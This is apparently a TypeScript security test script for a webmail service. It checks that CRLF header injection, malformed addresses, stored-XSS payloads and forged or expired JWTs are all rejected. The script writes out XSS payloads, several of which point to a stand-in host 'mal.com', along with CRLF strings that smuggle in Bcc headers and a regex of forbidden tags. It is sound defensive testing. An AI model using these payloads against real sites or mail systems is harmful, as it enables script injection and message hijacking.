/**
 * Sondagem de seguranca focada em injecao — roda sem banco.
 *
 * Existe separada do teste de integracao porque o alvo aqui nao e "a
 * funcionalidade funciona", e sim "o campo controlado pelo usuario consegue
 * escapar do lugar dele". Cada caso abaixo e um vetor real de e-mail.
 *
 *   npx tsx src/scripts/security-probe.ts
 */

import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const workDir = mkdtempSync(join(tmpdir(), "avila-mail-sec-"));
process.env.MAIL_STORAGE_DIR = workDir;
process.env.MAIL_DKIM_ENCRYPTION_KEY ??= "c".repeat(64);
process.env.MAIL_JWT_SECRET ??= "d".repeat(64);
process.env.MAIL_DATABASE_URL ??= "postgresql://sec:sec@127.0.0.1:5432/sec";
process.env.MAIL_HOSTNAME ??= "mail.avilaops.com";

const MailComposer = (await import("nodemailer/lib/mail-composer/index.js")).default;
const { sanitizeMessageHtml } = await import("../lib/sanitize.js");
const { parseAddress } = await import("../lib/address.js");
const { signAccessToken, verifyAccessToken } = await import("../lib/jwt.js");
const jwt = (await import("jsonwebtoken")).default;

let passed = 0;
let failed = 0;

function check(label: string, condition: boolean, detail = ""): void {
  if (condition) {
    passed += 1;
    console.log(`  ok   ${label}`);
  } else {
    failed += 1;
    console.error(`  FALHA ${label}${detail ? ` — ${detail}` : ""}`);
  }
}

console.log("\n[A] Injecao de cabecalho SMTP (CRLF)");

/**
 * Classico do e-mail: assunto com CRLF vira cabecalho novo. Se passar, o
 * atacante injeta Bcc: e usa a caixa do cliente para disparar copia oculta
 * para onde quiser.
 */
async function montarComAssunto(subject: string): Promise<string> {
  const composer = new MailComposer({
    from: "contato@brilhax.com.br",
    to: "destino@exemplo.com",
    subject,
    text: "corpo",
  });
  return (await composer.compile().build()).toString("utf8");
}

const mimeBcc = await montarComAssunto("Oi\r\nBcc: vitima@alvo.com");
check("CRLF no assunto nao cria header Bcc", !/^bcc:/im.test(mimeBcc));

const mimeQuebra = await montarComAssunto("Oi\r\n\r\nCorpo falso injetado");
check("CRLF duplo nao encerra o bloco de headers", !mimeQuebra.includes("\r\n\r\nCorpo falso injetado"));

const mimeLf = await montarComAssunto("Oi\nX-Injetado: sim");
check("LF sozinho nao cria header", !/^x-injetado:/im.test(mimeLf));

async function montarComNome(name: string): Promise<string> {
  const composer = new MailComposer({
    from: { name, address: "contato@brilhax.com.br" },
    to: "destino@exemplo.com",
    subject: "assunto",
    text: "corpo",
  });
  return (await composer.compile().build()).toString("utf8");
}

const mimeNome = await montarComNome("Fulano\r\nBcc: vitima@alvo.com");
check("CRLF no nome de exibicao nao cria header", !/^bcc:/im.test(mimeNome));

console.log("\n[B] Validacao de endereco");
check("recusa CRLF no endereco", parseAddress("a@b.com\r\nBcc: c@d.com") === null);
check("recusa espaco no endereco", parseAddress("a b@c.com") === null);
check("recusa endereco so com arroba", parseAddress("@") === null);
check("recusa dominio comecando com hifen", parseAddress("a@-b.com") === null);
check("recusa dupla arroba", parseAddress("a@b@c.com") === null);
check("recusa nulo embutido", parseAddress("a\0@b.com") === null);

console.log("\n[C] XSS armazenado no corpo HTML");

const vetores: Array<[string, string]> = [
  ["script inline", "<script>alert(1)</script>"],
  ["script com atributo", "<script src='//mal.com/x.js'></script>"],
  ["svg onload", "<svg onload=alert(1)>"],
  ["img onerror", "<img src=x onerror=alert(1)>"],
  ["body onload", "<body onload=alert(1)>"],
  ["iframe", "<iframe src='//mal.com'></iframe>"],
  ["object", "<object data='//mal.com'></object>"],
  ["embed", "<embed src='//mal.com'>"],
  ["form com action", "<form action='//mal.com'><input name=senha></form>"],
  ["meta refresh", "<meta http-equiv=refresh content='0;url=//mal.com'>"],
  ["base tag", "<base href='//mal.com/'>"],
  ["link stylesheet", "<link rel=stylesheet href='//mal.com/x.css'>"],
  ["style com expression", "<style>body{background:url('javascript:alert(1)')}</style>"],
  ["href javascript", "<a href='javascript:alert(1)'>x</a>"],
  ["href javascript com espacos", "<a href=' java\tscript:alert(1)'>x</a>"],
  ["href data html", "<a href='data:text/html,<script>alert(1)</script>'>x</a>"],
  ["href vbscript", "<a href='vbscript:msgbox(1)'>x</a>"],
  ["onclick", "<div onclick='alert(1)'>x</div>"],
  ["onmouseover", "<div onmouseover=alert(1)>x</div>"],
  ["style url javascript", "<div style=\"background:url(javascript:alert(1))\">x</div>"],
  ["style position fixed", "<div style='position:fixed;top:0;left:0;width:100vw'>x</div>"],
  ["srcdoc", "<iframe srcdoc='<script>alert(1)</script>'></iframe>"],
  ["animate", "<svg><animate onbegin=alert(1)></svg>"],
];

const PROIBIDOS = /<script|<iframe|<object|<embed|<form|<meta|<base|<link|<style|javascript:|vbscript:|\son\w+\s*=|srcdoc|position\s*:\s*fixed/i;

for (const [rotulo, payload] of vetores) {
  const { html } = sanitizeMessageHtml(payload, true);
  check(`neutraliza ${rotulo}`, !PROIBIDOS.test(html), `saida: ${html.slice(0, 120)}`);
}

console.log("\n[D] Preservacao do conteudo legitimo");
const legitimo =
  '<p style="color:#333">Ola <b>time</b>,</p><table><tr><td>Item</td><td>R$ 10</td></tr></table>' +
  '<a href="https://avilaops.com">site</a><img src="https://cdn.exemplo.com/logo.png" alt="logo">';
const { html: limpo } = sanitizeMessageHtml(legitimo, true);
check("mantem paragrafo e negrito", limpo.includes("<b>time</b>"));
check("mantem tabela", limpo.includes("<table>") && limpo.includes("R$ 10"));
check("mantem link e adiciona rel", limpo.includes("https://avilaops.com") && limpo.includes("noopener"));
check("mantem imagem quando liberada", limpo.includes("cdn.exemplo.com/logo.png"));
check("mantem cor inline", limpo.includes("color"));

console.log("\n[E] Token de sessao");
const tokenValido = signAccessToken({ sub: "cx1", adr: "a@b.com", sid: "s1" });
check("token proprio valida", verifyAccessToken(tokenValido)?.sub === "cx1");

const semAssinatura = `${tokenValido.split(".").slice(0, 2).join(".")}.`;
check("recusa token sem assinatura", verifyAccessToken(semAssinatura) === null);

const algNone = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url");
const payloadFalso = Buffer.from(JSON.stringify({ sub: "cx2", adr: "x@y.com", sid: "s2" })).toString("base64url");
check("recusa alg=none", verifyAccessToken(`${algNone}.${payloadFalso}.`) === null);

const outroSegredo = jwt.sign({ sub: "cx3", adr: "x@y.com", sid: "s3" }, "segredo-do-atacante", {
  algorithm: "HS256",
  issuer: "avila-mail",
  audience: "avila-mail-webmail",
});
check("recusa token assinado com outro segredo", verifyAccessToken(outroSegredo) === null);

const emissorErrado = jwt.sign({ sub: "cx4", adr: "x@y.com", sid: "s4" }, process.env.MAIL_JWT_SECRET, {
  algorithm: "HS256",
  issuer: "outro-sistema",
  audience: "avila-mail-webmail",
});
check("recusa emissor diferente", verifyAccessToken(emissorErrado) === null);

const publicoErrado = jwt.sign({ sub: "cx5", adr: "x@y.com", sid: "s5" }, process.env.MAIL_JWT_SECRET, {
  algorithm: "HS256",
  issuer: "avila-mail",
  audience: "outro-publico",
});
check("recusa audiencia diferente", verifyAccessToken(publicoErrado) === null);

const expirado = jwt.sign({ sub: "cx6", adr: "x@y.com", sid: "s6" }, process.env.MAIL_JWT_SECRET, {
  algorithm: "HS256",
  issuer: "avila-mail",
  audience: "avila-mail-webmail",
  expiresIn: "-1h",
});
check("recusa token expirado", verifyAccessToken(expirado) === null);

const semCampos = jwt.sign({ sub: "cx7" }, process.env.MAIL_JWT_SECRET, {
  algorithm: "HS256",
  issuer: "avila-mail",
  audience: "avila-mail-webmail",
});
check("recusa payload incompleto", verifyAccessToken(semCampos) === null);

rmSync(workDir, { recursive: true, force: true });

console.log(`\n${failed === 0 ? "PASSOU" : "FALHOU"} — ${passed} verificacoes ok, ${failed} falhas\n`);
process.exit(failed === 0 ? 0 : 1);
